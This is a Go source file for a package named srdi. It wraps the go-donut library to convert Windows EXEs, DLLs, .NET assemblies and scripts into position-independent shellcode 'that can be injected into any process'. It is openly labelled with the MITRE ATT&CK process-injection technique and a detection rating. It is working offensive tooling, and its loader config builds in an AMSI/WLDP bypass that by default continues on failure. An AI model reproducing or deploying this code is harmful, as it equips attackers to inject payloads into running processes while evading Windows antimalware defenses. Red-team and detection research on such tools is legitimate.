// Package srdi provides PE/DLL/EXE-to-shellcode conversion using the Donut
// framework. Converts standard Windows executables into position-independent
// shellcode that can be injected into any process.
//
// This package wraps github.com/Binject/go-donut for shellcode generation.
// Supported input formats: native EXE, native DLL, .NET EXE, .NET DLL,
// VBScript, JScript, XSL.
//
// MITRE ATT&CK: T1055.001 (Process Injection: DLL Injection)
// Detection: Medium
//
// References:
//   - https://github.com/Binject/go-donut
//   - https://github.com/TheWover/donut
package srdi

import (
	"bytes"
	"fmt"

	"github.com/Binject/go-donut/donut"
)

// Arch represents the target architecture for shellcode generation.
type Arch int

const (
	ArchX32 Arch = iota // 32-bit only
	ArchX64             // 64-bit only
	ArchX84             // dual-mode (32+64)
)

func (a Arch) String() string {
	switch a {
	case ArchX32:
		return "x32"
	case ArchX64:
		return "x64"
	case ArchX84:
		return "x84"
	default:
		return fmt.Sprintf("Arch(%d)", int(a))
	}
}

// ModuleType represents the type of input binary.
type ModuleType int

const (
	ModuleNetDLL ModuleType = 1 // .NET DLL
	ModuleNetEXE ModuleType = 2 // .NET EXE
	ModuleDLL    ModuleType = 3 // Native DLL
	ModuleEXE    ModuleType = 4 // Native EXE
	ModuleVBS    ModuleType = 5 // VBScript
	ModuleJS     ModuleType = 6 // JScript
	ModuleXSL    ModuleType = 7 // XSL
)

func (m ModuleType) String() string {
	switch m {
	case ModuleNetDLL:
		return "NetDLL"
	case ModuleNetEXE:
		return "NetEXE"
	case ModuleDLL:
		return "DLL"
	case ModuleEXE:
		return "EXE"
	case ModuleVBS:
		return "VBS"
	case ModuleJS:
		return "JS"
	case ModuleXSL:
		return "XSL"
	default:
		return fmt.Sprintf("ModuleType(%d)", int(m))
	}
}

// Config controls the shellcode generation.
type Config struct {
	// Arch is the target architecture (default: ArchX64).
	Arch Arch

	// Type is the input binary type. If zero, auto-detected by ConvertFile.
	Type ModuleType

	// Class is the .NET class name (required for .NET DLL).
	Class string

	// Method is the .NET method name or native DLL export to call.
	Method string

	// Parameters are command-line arguments passed to the payload.
	Parameters string

	// Bypass controls AMSI/WLDP bypass in the loader stub.
	// 1 = skip, 2 = abort on fail, 3 = continue on fail (default).
	Bypass int

	// Thread runs the entry point in a new thread if true.
	Thread bool
}

// DefaultConfig returns a sensible default configuration.
func DefaultConfig() *Config {
	return &Config{
		Arch:   ArchX64,
		Type:   ModuleEXE,
		Bypass: 3, // continue on AMSI/WLDP fail
	}
}

// ConvertFile converts a PE/DLL/.NET/VBS/JS file to position-independent shellcode.
// Auto-detects the file type by extension.
func ConvertFile(path string, cfg *Config) ([]byte, error) {
	if cfg == nil {
		cfg = DefaultConfig()
	}

	dcfg := mapConfig(cfg)
	buf, err := donut.ShellcodeFromFile(path, dcfg)
	if err != nil {
		return nil, fmt.Errorf("donut: %w", err)
	}
	return buf.Bytes(), nil
}

// ConvertBytes converts raw PE/DLL bytes to position-independent shellcode.
// You must set cfg.Type explicitly when using this function (no auto-detection).
func ConvertBytes(data []byte, cfg *Config) ([]byte, error) {
	if len(data) < 2 {
		return nil, fmt.Errorf("input too short (%d bytes)", len(data))
	}
	if data[0] != 'M' || data[1] != 'Z' {
		return nil, fmt.Errorf("invalid PE: missing MZ header")
	}

	if cfg == nil {
		cfg = DefaultConfig()
	}

	dcfg := mapConfig(cfg)
	buf, err := donut.ShellcodeFromBytes(bytes.NewBuffer(data), dcfg)
	if err != nil {
		return nil, fmt.Errorf("donut: %w", err)
	}
	return buf.Bytes(), nil
}

// ConvertDLL converts a DLL file into position-independent shellcode.
// Shorthand for ConvertFile with Type set to ModuleDLL.
func ConvertDLL(dllPath string, cfg *Config) ([]byte, error) {
	c := configWithType(cfg, ModuleDLL)
	return ConvertFile(dllPath, c)
}

// ConvertDLLBytes converts raw DLL bytes into shellcode.
// Shorthand for ConvertBytes with Type set to ModuleDLL.
func ConvertDLLBytes(dllBytes []byte, cfg *Config) ([]byte, error) {
	c := configWithType(cfg, ModuleDLL)
	return ConvertBytes(dllBytes, c)
}

// configWithType returns a copy of cfg with Type overridden.
// If cfg is nil, DefaultConfig() is used as the base.
func configWithType(cfg *Config, t ModuleType) *Config {
	if cfg == nil {
		cfg = DefaultConfig()
	}
	copy := *cfg
	copy.Type = t
	return &copy
}

// mapConfig converts our Config to go-donut's DonutConfig.
func mapConfig(cfg *Config) *donut.DonutConfig {
	dcfg := donut.DefaultConfig()
	dcfg.Arch = donut.DonutArch(cfg.Arch)
	dcfg.Type = donut.ModuleType(cfg.Type)
	dcfg.Class = cfg.Class
	dcfg.Method = cfg.Method
	dcfg.Parameters = cfg.Parameters
	dcfg.Bypass = cfg.Bypass
	if cfg.Thread {
		dcfg.Thread = 1
	}
	return dcfg
}
